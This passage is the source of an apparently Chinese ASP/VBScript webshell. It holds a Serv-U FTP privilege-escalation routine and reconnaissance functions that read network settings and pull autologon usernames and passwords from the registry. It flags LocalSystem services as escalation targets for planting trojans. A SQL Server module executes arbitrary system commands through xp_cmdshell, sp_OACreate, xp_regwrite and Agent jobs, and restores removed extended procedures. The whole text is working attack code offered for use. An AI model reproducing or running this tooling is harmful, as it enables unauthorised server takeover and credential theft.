"-Maintenance=System" & vbcrlf & "-PasswordType=Regular" & vbcrlf & "-Ratios=None" & vbcrlf & " Access=" & tpath & "\|RWAMELCDP" & vbcrlf
leaves = leaves & "quit" & vbcrlf
on error resume next
set xpost = createobject("MSXML2.XMLHTTP")
xpost.open "POST", "http://127.0.0.1:"& port &"/leaves", true
xpost.send(leaves)
set xpost=nothing
response.write ("命令成功执行！！FTP 用户名: " & tuser & " " & "密码: " & tpass & " 路径: " & tpath & " :)<br><BR>")
else
leaves = "User " & usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-DELETEUSER" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & " User=" & tuser & vbcrlf
set xpost3 = createobject("MSXML2.XMLHTTP")
xpost3.open "POST", "http://127.0.0.1:"& port &"/leaves", true
xpost3.send(leaves)
set xpost3=nothing
end if
End Function

Function fuck()
On Error Resume Next
dim wsh
set wsh=createobject("Wscript.Shell")
SoftPath=Wsh.Environment.item("Path")
Pathinfo=lcase(SoftPath)
Response.Write"<LI>系统软件支持:<BR>"
Response.Write"-----------------------------<br>"
if Instr(Pathinfo,"perl") Then Response.Write "<li>Perl脚本:支持<br>"
if instr(Pathinfo,"java") Then Response.Write "<li>Java脚本:支持<br>"
if instr(Pathinfo,"microsoft sql server") Then Response.Write "<li>MSSQL数据库服务:支持<br>"
if instr(Pathinfo,"mysql") Then Response.Write "<li>MySQL数据库服务:支持<br>"
if instr(Pathinfo,"oracle") Then Response.Write "<li>Oracle数据库服务:支持<br>"
if instr(Pathinfo,"cfusionmx7") Then Response.Write "<li>CFM服务器:支持<br>"
if instr(Pathinfo,"pcanywhere") Then Response.Write "<li>赛门铁克PcAnywhere控制:支持<br>"
if instr(Pathinfo,"Kill") Then Response.Write "<li>Kill杀毒软件:支持<br>"
if instr(Pathinfo,"kav") Then Response.Write "<li>金山系列杀毒软件:支持<br>"
if instr(Pathinfo,"antivirus") Then Response.Write "<li>赛门铁克杀毒软件:支持<br>"
if instr(Pathinfo,"rising") Then Response.Write "<li>瑞星系列杀毒软件:支持<br>"
paths=split(SoftPath,";")
Response.Write "------------------------------------<br>"
Response.Write "系统当前路径变量:<br>"
For i=Lbound(paths) to Ubound(paths)
Response.Write "<li>"&paths(i)&"<br>"
next
end Function

Function  hook()
on error resume next
dim wsh
set wsh=createobject("Wscript.Shell")
	  Response.Write "[网络探测]<br><hr size=1>"
EnableTCPIPKey="HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters"
isEnable=Wsh.Regread(EnableTcpipKey)
If isEnable=0 or isEnable="" Then
  Notcpipfilter=1
End If
    ApdKey="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind"
    Apds=Wsh.RegRead(ApdKey)
    If IsArray(Apds) Then 
      For i=LBound(Apds) To UBound(Apds)-1
        ApdB=Replace(Apds(i),"\Device\","")
        Response.Write "网卡"&i&"的序列为:"&ApdB&"<br>"
        Path="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\"
        IPKey=Path&ApdB&"\IPAddress"
        IPaddr=Wsh.Regread(IPKey)
        If IPaddr(0)<>"" Then
          For j=Lbound(IPAddr) to Ubound(IPAddr)
            Response.Write "<li>IP地址"&j&"为:"&IPAddr(j)&"<br>"
          Next
        Else
          Response.Write "<li>IP地址无法读取或没有设置<br>"
        End if
        GateWayKey=Path&ApdB&"\DefaultGateway"
        GateWay=Wsh.Regread(GateWayKey)
        If isarray(GateWay) Then
          For j=Lbound(Gateway) to Ubound(Gateway)
            Response.Write "<li>网关"&j&"为:"&Gateway(j)&"<br>"
          Next
        Else
          Response.Write "<li>默认网关无法读取或没有设置<br>"
        End if
        DNSKey=Path&ApdB&"\NameServer"
        DNSstr=Wsh.RegRead(DNSKey)
        If DNSstr<>"" Then
          Response.Write "<li>网卡DNS为:"&DNSstr&"<br>"
        Else
          Response.Write "<li>默认DNS无法读取或没有设置<br>"
        End If
        if Notcpipfilter=1 Then 
          Response.Write "<li>没有Tcp/IP筛选<br>"
        else
          ETK="\TCPAllowedPorts"
          EUK="\UDPAllowedPorts"
          FullTCP=Path&ApdB&ETK
          FullUDP=path&ApdB&EUK
          tcpallow=Wsh.RegRead(FullTCP)
          If tcpallow(0)="" or tcpallow(0)=0 Then
            Response.Write "<li>允许的TCP端口为:全部<br>"
          Else
            Response.Write "<li>允许的TCP端口为:"
            For j = LBound(tcpallow) To UBound(tcpallow)
              Response.Write tcpallow(j)&","
            Next
            Response.Write "<Br>"
          End if
          udpallow=Wsh.RegRead(FullUDP)
          If udpallow(0)="" or udpallow(0)=0 Then
            Response.Write "<li>允许的UDP端口为:全部<br>"
          Else
            Response.Write "<li>允许的UDP端口为:"
            for j = LBound(udpallow) To UBound(udpallow)
              Response.Write UDPallow(j)&","
            next
            Response.Write "<br>"
          End if
        End if
        Response.Write "------------------------------------------------<br>"
      Next
    end if
	Response.Write "<br><br>[系统设置探测]<br><hr size=1>"
pcnamekey="HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName"
pcname=wsh.RegRead(pcnamekey)
if pcname="" Then pcname="无法读取主机名.<br>"
Response.Write "<li>当前主机名为:"&pcname&"<br>"
AdminNameKey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AltDefaultUserName"
AdminName=wsh.RegRead(AdminNameKey)
if adminname="" Then AdminName="Administrator"
Response.Write "<li>默认管理员用户名为:"&AdminName&"<br>"
isAutologin="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoAdminLogon"
Autologin=Wsh.RegRead(isAutologin)
if Autologin=0 or Autologin="" Then
  Response.Write "<li>用户自动登入:未启用<br>"
Else
  Response.Write "<li>用户自动登入:启用<br>"
  Admin=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName")
  Passwd=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword")
  Response.Write "<li type=square>用户名:"&Admin&"<br>"
  Response.Write "<li type=square>密码:"&Passwd&"<br>"
End if
displogin=wsh.regRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DontDisplayLastUserName")
If displogin="" or displogin=0 Then disply="是" else disply="否"
Response.Write "<li>是否显示上次登入用户:"&disply&"<br>"
NTMLkey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0\NTML"
ntml=Wsh.RegRead(NTMLkey)
if ntml="" Then Ntml=1
Response.Write "<li>Telnet Ntml设置为:"&ntml&"<br>"
hk="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count"
kk=wsh.RegRead(hk)
Response.Write"<li>当前活动网卡为:"&kk&"<br>"
Response.Write "------------------------------------<br><br><br>"
end Function

Function gody()
Response.write "[服务器弱点探测]<br><hr>"
Set objComputer = GetObject("WinNT://.")
    Set sa = Server.CreateObject("Shell.Application")
    objComputer.Filter = Array("Service")
    For Each objService In objComputer
      if objService.Name="Serv-U" Then
        if objService.ServiceAccountName="LocalSystem" Then
          Response.Write "<li>服务器中有Serv-U安装,且以LocalSystem权限启动,可以考虑提权<br>"
        End if
      End if
      if lcase(objService.Name)="apache" Then
        if objService.ServiceAccountName="LocalSystem" Then
          If instr(Request.ServerVariables("SERVER_SOFTWARE"),"Apache") Then
            Response.Write "<li>当前WEB服务器为Apache.可以直接提权<br>"
          Else
            Response.Write " <li>服务器中有Apache服务存在,启动权限为LocalSystem,可以考虑PHP木马<br>"
          End if
        end if
      End if
      if instr(lcase(objService.Name),"tomcat") Then
        if objService.ServiceAccountName="LocalSystem" Then
          Response.Write "<li>服务器中有Tomcat,且以LocalSystem权限启动,可以考虑使用Jsp木马提权<br>"
        End if
      End if
       if instr(lcase(objService.Name),"winmail") Then
        if objService.ServiceAccountName="LocalSystem" Then
          Response.Write "<li>服务器中有Magic Winmail,且以LocalSystem权限启动,可以查找WebMail目录,并且写入PHP木马<br>"
        End if
      End if
    Next
      Set fso=Server.Createobject("Scripting.FileSystemObject")
      Sysdrive=left(Fso.GetspecialFolder(2),2)
      servername=wsh.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName")
      If fso.FileExists(sysdriver&"\Documents And Settings\All Users\Application Data\Symantec\"&servername&".cif") Then
        Response.Write "<li>发现pcAnywhere密码文件,可以从默认目录下载并破解得到pcAnywhere密码"
      End if
	  end Function

Function sqlabc()
IF SESSION("LOGIN")="" THEN
                           RESPONSE.WRITE "<CENTER><FONT COLOR=RED>没有登陆</FONT></CENTER><BR>"
			   ELSE RESPONSE.WRITE "<CENTER><FONT COLOR=RED>已经登陆</FONT></CENTER><BR>"
END IF
                           RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>退出登陆</FONT></A></CENTER><BR>"

IF REQUEST("SQLAAA")="LOGIN" THEN
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & REQUEST.FORM("SERVER") & "," & REQUEST.FORM("PORT") & ";PASSWORD=" & REQUEST.FORM("PASS") & ";UID=" & REQUEST.FORM("NAME")
                       IF ERR.NUMBER=-2147467259 THEN 
                       RESPONSE.WRITE "<FONT COLOR=RED>数据源连接错误，请检查！</FONT>"
                       RESPONSE.END
                       ELSEIF ERR.NUMBER=-2147217843 THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>用户名密码错误错误，请检查！</FONT>"
                       RESPONSE.END
                       ELSEIF ERR.NUMBER=0 THEN
                       STRQUERY="SELECT @@VERSION"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
		       IF INSTR(RECRESULT(0),"NT 5.0") THEN
		       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS 2000系统</FONT><BR>"
                       SESSION("SYSTEM")="2000"
                       ELSEIF INSTR(RECRESULT(0),"NT 5.1")  THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS XP系统</FONT><BR>"
                       SESSION("SYSTEM")="XP"
                       ELSEIF INSTR(RECRESULT(0),"NT 5.2")  THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS 2003系统</FONT><BR>"
                       SESSION("SYSTEM")="2003"
                       ELSE
                       RESPONSE.WRITE "<FONT COLOR=RED>其他系统</FONT><BR>"
                       SESSION("SYSTEM")="NO"
                       END IF
                       STRQUERY="SELECT IS_SRVROLEMEMBER('SYSADMIN')"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
                       IF RECRESULT(0)=1 THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>恭喜！SQL SERVER最高权限</FONT><BR>"
                       SESSION("PRI")=1
                       ELSE
                       RESPONSE.WRITE "<FONT COLOR=RED>郁闷，权限不够估计不能执行命令！</FONT><BR>"
                       SESSION("PRI")=0
                       END IF              
		       SESSION("LOGIN")="YES"
		       SESSION("NAME")=REQUEST.FORM("NAME")
		       SESSION("PASS")=REQUEST.FORM("PASS")
		       SESSION("SERVER")=REQUEST.FORM("SERVER")
		       SESSION("PORT")=REQUEST.FORM("PORT")
                       END IF

ELSEIF REQUEST("SQLAAA")="TEST"  THEN
                       IF SESSION("LOGIN")<>"" THEN
                       IF SESSION("SYSTEM")="2000" THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS 2000系统</FONT><BR>"
                       ELSEIF SESSION("SYSTEM")="XP" THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS XP系统</FONT><BR>"
                       ELSEIF SESSION("SYSTEM")="2003" THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS 2003系统</FONT><BR>"
                       ELSE
                       RESPONSE.WRITE "<FONT COLOR=RED>其他操作系统</FONT><BR>"
                       END IF
                       IF SESSION("PRI")=1 THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>恭喜！SQL SERVER最高权限</FONT><BR>"
                       ELSE 
                       RESPONSE.WRITE "<FONT COLOR=RED>郁闷，权限不够估计不能执行命令！</FONT><BR>"
                       END IF
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")        

                       STRQUERY="SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='XP_CMDSHELL'"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
		       IF RECRESULT(0) THEN
		       SESSION("XP_CMDSHELL")=1 
		       RESPONSE.WRITE "<FONT COLOR=RED>XP_CMDSHELL............. 存在!</FONT>"
                       ELSE
		       SESSION("XP_CMDSHELL")=0 
		       RESPONSE.WRITE "<FONT COLOR=RED>XP_CMDSHELL............. 不存在!</FONT>"
                       END IF
		       STRQUERY="SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='SP_OACREATE'"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
		       IF RECRESULT(0) THEN 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>SP_OACREATE............. 存在!</FONT>"
		       SESSION("SP_OACREATE")=1
                       ELSE 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>SP_OACREATE............. 不存在!</FONT>"
                       SESSION("SP_OACREATE")=0
                       END IF
		       STRQUERY="SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='XP_REGWRITE'"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
		       IF RECRESULT(0) THEN 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>XP_REGWRITE............. 存在!</FONT>"
		       SESSION("XP_REGWRITE")=1
                       ELSE 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>XP_REGWRITE............. 不存在!</FONT>"
		       SESSION("XP_REGWRITE")=0
                       END IF
		       STRQUERY="SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='XP_SERVICECONTROL'"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
		       IF RECRESULT(0) THEN 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>XP_SERVICECONTROL 存在!</FONT>"
		       SESSION("XP_SERVICECONTROL")=1
                       ELSE 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>XP_SERVICECONTROL 不存在!</FONT>"
		       SESSION("XP_SERVICECONTROL")=0
                       END IF
                       ELSE 
                       RESPONSE.WRITE "<SCRIPT>ALERT('操作超时，重新登陆！')</SCRIPT>"
                       RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>登陆超时</FONT>"
                       RESPONSE.END
                       END IF 

ELSEIF REQUEST("SQLAAA")="CMD" THEN
                       IF SESSION("LOGIN")<>"" THEN
                       IF SESSION("PRI")=1 THEN
		       IF REQUEST("TOOL")="XP_CMDSHELL" THEN
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
		       IF REQUEST.FORM("CMD")<>"" THEN 
  		       STRQUERY = "EXEC MASTER.DBO.XP_CMDSHELL '" & REQUEST.FORM("CMD") & "'" 
                       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
                       IF NOT RECRESULT.EOF THEN 
                       DO WHILE NOT RECRESULT.EOF 
                       STRRESULT = STRRESULT & CHR(13) & RECRESULT(0) 
                       RECRESULT.MOVENEXT 
                       LOOP
		       END IF
		       SET RECRESULT = NOTHING
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
                       RESPONSE.WRITE "利用"&REQUEST("TOOL")&"扩展执行"
                       RESPONSE.WRITE REQUEST.FORM("CMD") 
                       RESPONSE.WRITE STRRESULT
                       RESPONSE.WRITE "</TEXTAREA>"
		       END IF 
		       		       
                       ELSEIF REQUEST("TOOL")="SP_OACREATE" THEN 
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
		       IF REQUEST.FORM("CMD")<>"" THEN 
  		       STRQUERY = "CREATE TABLE [JNC](RESULTTXT NVARCHAR(1024) NULL);USE MASTER DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL',@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD /C "&REQUEST("CMD")&" > 8617.TMP',0,TRUE;BULK INSERT [JNC] FROM '8617.TMP' WITH (KEEPNULLS);"
		       ADOCONN.EXECUTE(STRQUERY)
                       STRQUERY = "SELECT * FROM JNC"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
		       IF NOT RECRESULT.EOF THEN 
                       DO WHILE NOT RECRESULT.EOF 
                       STRRESULT = STRRESULT & CHR(13) & RECRESULT(0) 
                       RECRESULT.MOVENEXT 
                       LOOP 
                       END IF
		       SET RECRESULT = NOTHING
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
		       RESPONSE.WRITE "利用"&REQUEST("TOOL")&"扩展执行"	
                       RESPONSE.WRITE REQUEST.FORM("CMD") 
                       RESPONSE.WRITE STRRESULT
                       RESPONSE.WRITE "</TEXTAREA>"
		       STRQUERY = "DROP TABLE [JNC];DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL',@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD /C DEL 8617.TMP'"
 		       ADOCONN.EXECUTE(STRQUERY)
		       END IF

                       ELSEIF REQUEST("TOOL")="XP_REGWRITE" THEN
                       IF SESSION("SYSTEM")="2000" THEN
                       PATH="C:\WINNT\SYSTEM32\IAS\IAS.MDB"
                       ELSE
                       PATH="C:\WINDOWS\SYSTEM32\IAS\IAS.MDB"
                       END IF
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
		       IF REQUEST.FORM("CMD")<>"" THEN
		       CMD=CHR(34)&"CMD.EXE /C "&REQUEST.FORM("CMD")&" > 8617.TMP"&CHR(34)
		       STRQUERY = "CREATE TABLE [JNC](RESULTTXT NVARCHAR(1024) NULL);EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\MICROSOFT\JET\4.0\ENGINES','SANDBOXMODE','REG_DWORD',0;SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=" & PATH &"','SELECT SHELL("&CMD&")');"
                       ADOCONN.EXECUTE(STRQUERY)
		       STRQUERY = "SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=" & PATH &"','SELECT SHELL("&CHR(34)&"CMD.EXE /C COPY 8617.TMP JNC.TMP"&CHR(34)&")');BULK INSERT [JNC] FROM 'JNC.TMP' WITH (KEEPNULLS);"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
		       STRQUERY="SELECT * FROM [JNC];"
                       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
		       IF NOT RECRESULT.EOF THEN 
                       DO WHILE NOT RECRESULT.EOF 
                       STRRESULT = STRRESULT & CHR(13) & RECRESULT(0) 
                       RECRESULT.MOVENEXT 
                       LOOP 
                       END IF
                       SET RECRESULT = NOTHING
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
                       RESPONSE.WRITE "利用"&REQUEST("TOOL")&"扩展执行"
                       RESPONSE.WRITE REQUEST.FORM("CMD") 
                       RESPONSE.WRITE STRRESULT
                       RESPONSE.WRITE "</TEXTAREA>"
		       STRQUERY = "DROP TABLE [JNC];EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\MICROSOFT\JET\4.0\ENGINES','SANDBOXMODE','REG_DWORD',1;SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=" & PATH &"','SELECT SHELL("&CHR(34)&"CMD.EXE /C DEL 8617.TMP&&DEL JNC.TMP"&CHR(34)&")');"
		       ADOCONN.EXECUTE(STRQUERY)
		       END IF

		       ELSEIF REQUEST("TOOL")="SQLSERVERAGENT" THEN
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")

		       IF REQUEST.FORM("CMD")<>"" THEN
                       IF SESSION("SQLSERVERAGENT")=0 THEN
                       STRQUERY = "EXEC MASTER.DBO.XP_SERVICECONTROL 'START','SQLSERVERAGENT';"
                       ADOCONN.EXECUTE(STRQUERY)
                       SESSION("SQLSERVERAGENT")=1
                       END IF

		       STRQUERY = "USE MSDB CREATE TABLE [JNCSQL](RESULTTXT NVARCHAR(1024) NULL) EXEC SP_DELETE_JOB NULL,'X' EXEC SP_ADD_JOB 'X' EXEC SP_ADD_JOBSTEP NULL,'X',NULL,'1','CMDEXEC','CMD /C "&REQUEST.FORM("CMD")&"' EXEC SP_ADD_JOBSERVER NULL,'X',@@SERVERNAME EXEC SP_START_JOB 'X';"
                       ADOCONN.EXECUTE(STRQUERY)
                       ADOCONN.EXECUTE(STRQUERY)
                       ADOCONN.EXECUTE(STRQUERY)
                    
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
                       RESPONSE.WRITE "利用"&REQUEST("TOOL")&"扩展执行"
                       RESPONSE.WRITE REQUEST.FORM("CMD") 
                       RESPONSE.WRITE VBCRF
                       RESPONSE.WRITE "此扩展无回显，建议通过重定向查看命令结果"
                       RESPONSE.WRITE "</TEXTAREA>"
		       STRQUERY = "USE MSDB DROP TABLE [JNCSQL];"
                       ADOCONN.EXECUTE(STRQUERY)
                       END IF
                       ELSEIF REQUEST("TOOL")="" THEN 
                       RESPONSE.WRITE "<SCRIPT>ALERT('选择你要使用的扩展')</SCRIPT>"
                       END IF
                       ELSE
                       RESPONSE.WRITE "<SCRIPT>ALERT('权限不够哦！')</SCRIPT>"
                       END IF
                       ELSE 
                       RESPONSE.WRITE "<SCRIPT>ALERT('操作超时，重新登陆！')</SCRIPT>"
                       RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>登陆超时</FONT>"
                       RESPONSE.END
                       END IF

ELSEIF REQUEST("SQLAAA")="RESUME" THEN
                       IF SESSION("LOGIN")<>"" THEN
                       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
                       IF SESSION("XP_CMDSHELL")=0 THEN
                       STRQUERY="DBCC ADDEXTENDEDPROC ('XP_CMDSHELL','XPLOG70.DLL')"
		       ADOCONN.EXECUTE(STRQUERY)	
                       RESPONSE.WRITE "<FONT COLOR=RED>已经尝试恢复XP_CMDSHELL</FONT>"
                       ELSEIF SESSION("SP_OACREATE")=0 THEN
		       STRQUERY="DBCC ADDEXTENDEDPROC ('SP_OACREATE','ODSOLE70.DLL')"
		       ADOCONN.EXECUTE(STRQUERY)	
                       RESPONSE.WRITE "<FONT COLOR=RED>已经尝试恢复SP_OACREATE</FONT>"
		       ELSEIF SESSION("XP_REGWRITE")=0 THEN
		       STRQUERY="DBCC ADDEXTENDEDPROC ('XP_REGWRITE','XPSTAR.DLL')"
		       ADOCONN.EXECUTE(STRQUERY)	
                       RESPONSE.WRITE "<FONT COLOR=RED>已经尝试恢复XP_REGWRITE</FONT>"	
		       ELSE RESPONSE.WRITE "<FONT COLOR=RED>恭喜！组件齐全</FONT>"	
                       END IF
                       ELSE 
                       RESPONSE.WRITE "<SCRIPT>ALERT('操作超时，重新登陆！')</SCRIPT>"
                       RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>登陆超时</FONT>"
                       RESPONSE.END
                       END IF 	
                                
ELSEIF REQUEST("SQLAAA")="SQL" THEN
                       IF SESSION("LOGIN")<>"" THEN
		       IF REQUEST.FORM("SQL")<>"" THEN
                       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
                       STRQUERY=REQUEST.FORM("SQL")
                       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
                       IF NOT RECRESULT.EOF THEN 
                       DO WHILE NOT RECRESULT.EOF 
                       STRRESULT = STRRESULT & CHR(13) & RECRESULT(0) 
                       RECRESULT.MOVENEXT 
                       LOOP
		       END IF
		       SET RECRESULT = NOTHING
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
                       RESPONSE.WRITE "执行SQL语句:"
                       RESPONSE.WRITE REQUEST.FORM("SQL") 
                       RESPONSE.WRITE STRRESULT
                       RESPONSE.WRITE "</TEXTAREA>"
                       END IF
                       ELSE 
                       RESPONSE.WRITE "<SCRIPT>ALERT('操作超时，重新登陆！')</SCRIPT>"
                       RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>登陆超时</FONT>"
                       RESPONSE.END
                       END IF

ELSEIF REQUEST("SQLAAA")="LOGOUT" THEN
                       SET ADOCONN=NOTHING
                       SESSION("LOGIN")=""
                       SESSION("NAME")=""
                       SESSION("PASS")=""
                       SESSION("SERVER")=""
                       SESSION("PORT")=""
                       SESSION("SYSTEM")=""
                       SESSION("PRI")=""		              
END IF
IF SESSION("LOGIN")="" THEN
			   RESPONSE.WRITE "<FORM NAME=FORM METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>SQL用户名："
			   RESPONSE.WRITE "<INPUT NAME=NAME TYPE=TEXT ID=NAME VALUE="&SESSION("NAME")&">"
 		           RESPONSE.WRITE "  SQL密码："
			   RESPONSE.WRITE "<INPUT NAME=PASS TYPE=PASSWORD ID=PASS VALUE="&SESSION("PASS")&">"
			   RESPONSE.WRITE "<P>SQL服务器："
			   RESPONSE.WRITE "<INPUT NAME=PORT TYPE=TEXT ID=SERVER VALUE=127.0.0.1>"
 		           RESPONSE.WRITE "  SQL端口："
			   RESPONSE.WRITE "<INPUT NAME=PORT TYPE=TEXT ID=PORT VALUE=1433>"
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=SUBMIT VALUE=LOGIN>"
			   RESPONSE.WRITE "</FORM>"

ELSE                       RESPONSE.WRITE "<FORM NAME=FORM METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>组件检测："
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=HIDDEN VALUE=TEST>"
			   RESPONSE.WRITE "  <INPUT TYPE=SUBMIT VALUE=检测组件>"
			   RESPONSE.WRITE "</FORM>"

                           RESPONSE.WRITE "<FORM NAME=FORM METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>组件恢复："
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=HIDDEN VALUE=RESUME>"
			   RESPONSE.WRITE "  <INPUT TYPE=SUBMIT VALUE=恢复组件>"
			   RESPONSE.WRITE "</FORM>"

		           RESPONSE.WRITE "<FORM NAME=FORM METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>系统命令："
			   RESPONSE.WRITE "  <INPUT NAME=CMD TYPE=TEXT>"
			   RESPONSE.WRITE "<SELECT NAME='TOOL' ><OPTION VALUE=''>----请选择运行程序的组件----</OPTION><OPTION VALUE=XP_CMDSHELL>XP_CMDSHELL</OPTION><OPTION VALUE=SP_OACREATE>SP_OACREATE</OPTION><OPTION VALUE=XP_REGWRITE>XP_REGWRITE</OPTION><OPTION VALUE=SQLSERVERAGENT>SQLSERVERAGENT</OPTION></OPTION></SELECT>"
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=HIDDEN VALUE=CMD>"
			   RESPONSE.WRITE "  <INPUT TYPE=SUBMIT VALUE=执行>"
			   RESPONSE.WRITE "</FORM>"
		           RESPONSE.WRITE "<FORM NAME=FORM1 METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
